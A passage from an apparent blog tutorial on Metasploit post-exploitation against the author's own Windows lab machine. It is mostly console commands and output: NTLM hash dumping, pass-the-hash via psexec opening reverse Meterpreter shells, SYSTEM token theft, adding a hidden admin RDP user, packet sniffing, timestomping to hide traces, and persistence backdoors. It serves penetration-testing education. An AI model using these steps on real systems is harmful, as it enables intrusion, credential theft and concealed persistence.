</span><span class='line'>    wdigest           Attempt to retrieve wdigest creds
</span><span class='line'>meterpreter &gt; msv
</span><span class='line'>[+] Running as SYSTEM
</span><span class='line'>[*] Retrieving msv credentials
</span><span class='line'>msv credentials
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>AuthID   Package    Domain           User              Password
</span><span class='line'>------   -------    ------           ----              --------
</span><span class='line'>0;98494  NTLM       WIN-D7GA2J1M0TU  wingoat           lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
</span><span class='line'>0;996    Negotiate  WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
</span><span class='line'>0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
</span><span class='line'>0;49813  NTLM                                          n.s. (Credentials KO)
</span><span class='line'>0;999    NTLM       WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)</span></code></pre></td></tr></table></div></figure>


<h3>Pass the hash</h3>

<p>We can now use the <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">psexec</a> module to pass the hash and get access on the box, without any cracking. Note that on my Windows lab machine, I had to go to Local Security Policy &ndash;> Local Policies &ndash;> Security Options &ndash;> Accounts: Limit local account use of blank passwords to console logon only and set it to disabled.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(psexec) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/smb/psexec):
</span><span class='line'>
</span><span class='line'>   Name                  Current Setting                                                    Required  Description
</span><span class='line'>   ----                  ---------------                                                    --------  -----------
</span><span class='line'>   RHOST                 192.168.80.128                                                     yes       The target address
</span><span class='line'>   RPORT                 445                                                                yes       Set the SMB service port
</span><span class='line'>   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
</span><span class='line'>   SERVICE_DISPLAY_NAME                                                                     no        The service display name
</span><span class='line'>   SERVICE_NAME                                                                             no        The service name
</span><span class='line'>   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
</span><span class='line'>   SMBDomain             .                                                                  no        The Windows domain to use for authentication
</span><span class='line'>   SMBPass               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  no        The password for the specified username
</span><span class='line'>   SMBUser               wingoat                                                            no        The username to authenticate as
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/x64/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     5555             yes       The listen port
</span><span class='line'>...
</span><span class='line'>msf exploit(psexec) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:5555 
</span><span class='line'>[*] Connecting to the server...
</span><span class='line'>[*] Authenticating to 192.168.80.128:445 as user 'wingoat'...
</span><span class='line'>[*] Selecting PowerShell target
</span><span class='line'>[*] 192.168.80.128:445 - Executing the payload...
</span><span class='line'>[+] 192.168.80.128:445 - Service start timed out, OK if running a command or non-service executable...
</span><span class='line'>[*] Sending stage (1188911 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49177) at 2016-06-09 11:37:22 -0400</span></code></pre></td></tr></table></div></figure>


<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use incognito
</span><span class='line'>Loading extension incognito...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Incognito Commands
</span><span class='line'>==================
</span><span class='line'>
</span><span class='line'>    Command              Description
</span><span class='line'>    -------              -----------
</span><span class='line'>    add_group_user       Attempt to add a user to a global group with all tokens
</span><span class='line'>    add_localgroup_user  Attempt to add a user to a local group with all tokens
</span><span class='line'>    add_user             Attempt to add a user with all tokens
</span><span class='line'>    impersonate_token    Impersonate specified token
</span><span class='line'>    list_tokens          List tokens available under current user context
</span><span class='line'>    snarf_hashes         Snarf challenge/response hashes for every token</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what tokens are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; list_tokens
</span><span class='line'>Usage: list_tokens &lt;list_order_option&gt;
</span><span class='line'>
</span><span class='line'>Lists all accessible tokens and their privilege level
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -g        List tokens by unique groupname
</span><span class='line'>    -u        List tokens by unique username
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>meterpreter &gt; list_tokens -u
</span><span class='line'>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span><span class='line'>             Call rev2self if primary process token is SYSTEM
</span><span class='line'>
</span><span class='line'>Delegation Tokens Available
</span><span class='line'>========================================
</span><span class='line'>NT AUTHORITY\LOCAL SERVICE
</span><span class='line'>NT AUTHORITY\NETWORK SERVICE
</span><span class='line'>NT AUTHORITY\SYSTEM
</span><span class='line'>WIN-D7GA2J1M0TU\wingoat
</span><span class='line'>
</span><span class='line'>Impersonation Tokens Available
</span><span class='line'>========================================
</span><span class='line'>NT AUTHORITY\ANONYMOUS LOGON</span></code></pre></td></tr></table></div></figure>


<p>We are interested in the delegation tokens that are created by interactive logins. And among them..the SYSTEM token that we want!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; impersonate_token 
</span><span class='line'>Usage: impersonate_token &lt;token&gt;
</span><span class='line'>
</span><span class='line'>Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.
</span><span class='line'>
</span><span class='line'>Hint: Double backslash DOMAIN\\name (meterpreter quirk)
</span><span class='line'>Hint: Enclose with quotation marks if name contains a space
</span><span class='line'>
</span><span class='line'>meterpreter &gt; impersonate_token 'NT AUTHORITY\SYSTEM'
</span><span class='line'>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span><span class='line'>             Call rev2self if primary process token is SYSTEM
</span><span class='line'>[+] Delegation token available
</span><span class='line'>[+] Successfully impersonated user NT AUTHORITY\SYSTEM
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run getgui
</span><span class='line'>Windows Remote Desktop Enabler Meterpreter Script
</span><span class='line'>Usage: getgui -u &lt;username&gt; -p &lt;password&gt;
</span><span class='line'>Or:    getgui -e
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -e        Enable RDP only.
</span><span class='line'>    -f &lt;opt&gt;  Forward RDP Connection.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -p &lt;opt&gt;  The Password of the user to add.
</span><span class='line'>    -u &lt;opt&gt;  The Username of the user to add.</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run getgui -e
</span><span class='line'>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
</span><span class='line'>[*] Carlos Perez carlos_perez@darkoperator.com
</span><span class='line'>[*] Enabling Remote Desktop
</span><span class='line'>[*]   RDP is disabled; enabling it ...
</span><span class='line'>[*] Setting Terminal Services service startup mode
</span><span class='line'>[*]   The Terminal Services service is not set to auto, changing it to auto ...
</span><span class='line'>[*]   Opening port in local firewall if necessary
</span><span class='line'>[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
</span><span class='line'>[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2112.rc
</span><span class='line'>meterpreter &gt; run getgui -u master -p pwned
</span><span class='line'>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
</span><span class='line'>[*] Carlos Perez carlos_perez@darkoperator.com
</span><span class='line'>[*] Setting user account for logon
</span><span class='line'>[*]   Adding User: master with Password: pwned
</span><span class='line'>[*]   Hiding user from Windows Login screen
</span><span class='line'>[*]   Adding User: master to local group 'Remote Desktop Users'
</span><span class='line'>[*]   Adding User: master to local group 'Administrators'
</span><span class='line'>[*] You can now login with the created user
</span><span class='line'>[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc</span></code></pre></td></tr></table></div></figure>


<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#rdesktop -u master -p pwned 192.168.80.128</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/tools/metasploit/rd.png" title="remote desktop" alt="remote desktop session on hacked machine"></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
</span><span class='line'>[*] Running Command List ...
</span><span class='line'>[*]   Running command execute -H -f cmd.exe -a "/c net user master /delete"
</span><span class='line'>Process 832 created.
</span><span class='line'>[*]   Running command reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v master
</span><span class='line'>[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.</span></code></pre></td></tr></table></div></figure>


<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use sniffer
</span><span class='line'>Loading extension sniffer...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Sniffer Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command             Description
</span><span class='line'>    -------             -----------
</span><span class='line'>    sniffer_dump        Retrieve captured packet data to PCAP file
</span><span class='line'>    sniffer_interfaces  Enumerate all sniffable network interfaces
</span><span class='line'>    sniffer_release     Free captured packets on a specific interface instead of downloading them
</span><span class='line'>    sniffer_start       Start packet capture on a specific interface
</span><span class='line'>    sniffer_stats       View statistics of an active capture
</span><span class='line'>    sniffer_stop        Stop packet capture on a specific interface</span></code></pre></td></tr></table></div></figure>


<p>First, we must learn what network interfaces are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_interfaces
</span><span class='line'>
</span><span class='line'>1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
</span><span class='line'>2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span></code></pre></td></tr></table></div></figure>


<p>Now we can start sniffing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_start 2
</span><span class='line'>[*] Capture started on interface 2 (50000 packet buffer)</span></code></pre></td></tr></table></div></figure>


<p>We can then dump the packets to a file and see if we&rsquo;ve got anything interesting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_dump 2 /root/capture.pcap
</span><span class='line'>[*] Flushing packet capture buffer for interface 2...
</span><span class='line'>[*] Flushed 873 packets (756096 bytes)
</span><span class='line'>[*] Downloaded 069% (524288/756096)...
</span><span class='line'>[*] Downloaded 100% (756096/756096)...
</span><span class='line'>[*] Download completed, converting to PCAP...
</span><span class='line'>[*] PCAP file written to /root/capture.pcap</span></code></pre></td></tr></table></div></figure>


<h3>Modifying file attributes</h3>

<p>If you left traces on the filesystem, you can modify or erase file attributes to conceal your footprints:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; timestomp -h
</span><span class='line'>
</span><span class='line'>Usage: timestomp OPTIONS file_path
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -a &lt;opt&gt;  Set the "last accessed" time of the file
</span><span class='line'>    -b        Set the MACE timestamps so that EnCase shows blanks
</span><span class='line'>    -c &lt;opt&gt;  Set the "creation" time of the file
</span><span class='line'>    -e &lt;opt&gt;  Set the "mft entry modified" time of the file
</span><span class='line'>    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -m &lt;opt&gt;  Set the "last written" time of the file
</span><span class='line'>    -r        Set the MACE timestamps recursively on a directory
</span><span class='line'>    -v        Display the UTC MACE values of the file
</span><span class='line'>    -z &lt;opt&gt;  Set all four attributes (MACE) of the file</span></code></pre></td></tr></table></div></figure>


<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<h4>Metsvc</h4>

<p>This is how Metsvc looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run metsvc -h
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -A        Automatically start a matching exploit/multi/handler to connect to the service
</span><span class='line'>    -h        This help menu
</span><span class='line'>    -r        Uninstall an existing Meterpreter service (files must be deleted manually)
</span><span class='line'>
</span><span class='line'>meterpreter &gt; run metsvc
</span><span class='line'>[*] Creating a meterpreter service on port 31337
</span><span class='line'>[*] Creating a temporary installation directory C:\Users\wingoat\AppData\Local\Temp\zMWkKgMkxJRdgpp...
</span><span class='line'>[*]  &gt;&gt; Uploading metsrv.x86.dll...
</span><span class='line'>[*]  &gt;&gt; Uploading metsvc-server.exe...
</span><span class='line'>[*]  &gt;&gt; Uploading metsvc.exe...
</span><span class='line'>[*] Starting the service...
</span><span class='line'>   * Installing service metsvc
</span><span class='line'> * Starting service
</span><span class='line'>Service metsvc successfully installed.</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, I couldn&rsquo;t connect to it because I got a bunch of SSL errors and I couldn&rsquo;t find any workaround.</p>

<h4>Persistence</h4>

<p>The Persistence script has more options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run persistence -h
</span><span class='line'>Meterpreter Script for creating a persistent backdoor on a target host.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -A        Automatically start a matching exploit/multi/handler to connect to the agent
</span><span class='line'>    -L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.
</span><span class='line'>    -P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.
</span><span class='line'>    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
</span><span class='line'>    -T &lt;opt&gt;  Alternate executable template to use
</span><span class='line'>    -U        Automatically start the agent when the User logs on
</span><span class='line'>    -X        Automatically start the agent when the system boots
</span><span class='line'>    -h        This help menu
</span><span class='line'>    -i &lt;opt&gt;  The interval in seconds between each connection attempt
</span><span class='line'>    -p &lt;opt&gt;  The port on which the system running Metasploit is listening
</span><span class='line'>    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back</span></code></pre></td></tr></table></div></figure>


<p>First, we set our listener:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span><span class='line'>PAYLOAD =&gt; windows/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(handler) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/handler):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     5555             yes       The listen port
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Then on the target machine we install the backdoor and it connects back to us!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run persistence -U -i 5 -p 5555 -r 192.168.80.155
</span><span class='line'>[*] Running Persistance Script
</span><span class='line'>[*] Resource file for cleanup created at /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.5432/WIN-D7GA2J1M0TU_20160610.5432.rc
</span><span class='line'>[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.80.155 LPORT=5555
</span><span class='line'>[*] Persistent agent script is 148445 bytes long
</span><span class='line'>[+] Persistent Script written to C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
</span><span class='line'>[*] Executing script C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
</span><span class='line'>[+] Agent executed with PID 2720
</span><span class='line'>[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
</span><span class='line'>[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[*] Sending stage (957487 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49172) at 2016-06-10 13:54:36 -0400</span></code></pre></td></tr></table></div></figure>


<p>When done, don&rsquo;t forget the cleanup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; resource /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
</span><span class='line'>[*] Reading /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
</span><span class='line'>[*] Running rm C://Users//wingoat//AppData//Local//Temp//cIABjXRUXdyyr.vbs
</span><span class='line'>
</span><span class='line'>[*] Running reg deleteval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' -v IbLYzVxLgKX
</span><span class='line'>
</span><span class='line'>Successfully deleted IbLYzVxLgKX.</span></code></pre></td></tr></table></div></figure>


<h2>Python extensions</h2>

<p>For us Python coders out there, Meterpreter has a nice Python extension that can allow us to run Python code without it being installed on the target machine</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; load python
</span><span class='line'>Loading extension python...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Python Commands
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>    Command         Description
</span><span class='line'>    -------         -----------
</span><span class='line'>    python_execute  Execute a python command string
</span><span class='line'>    python_import   Import/run a python file or module
</span><span class='line'>    python_reset    Resets/restarts the Python interpreter</span></code></pre></td></tr></table></div></figure>


<h1>Vulnerability scanning</h1>

<p>For web application assessments, Metasploit has a built-in web app scanner called WMAP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; load wmap
</span><span class='line'>
</span><span class='line'>.-.-.-..-.-.-..---..---.
</span><span class='line'>| | | || | | || | || |-'
</span><span class='line'>`-----'`-'-'-'`-^-'`-'
</span><span class='line'>[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
</span><span class='line'>[*] Successfully loaded plugin: wmap
